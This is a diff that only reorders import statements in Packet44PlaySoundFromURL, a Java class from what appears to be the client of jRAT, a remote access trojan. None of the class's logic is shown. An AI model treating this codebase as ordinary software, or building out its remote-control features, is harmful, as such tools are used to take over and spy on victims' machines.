@@ -1,12 +1,12 @@
 package jrat.client.packets.incoming;
 
-import jrat.common.codec.Hex;
 import jrat.client.Connection;
+import jrat.common.codec.Hex;
 
-import java.net.URL;
 import javax.sound.sampled.AudioInputStream;
 import javax.sound.sampled.AudioSystem;
 import javax.sound.sampled.Clip;
+import java.net.URL;
 
 
 public class Packet44PlaySoundFromURL extends AbstractIncomingPacket {
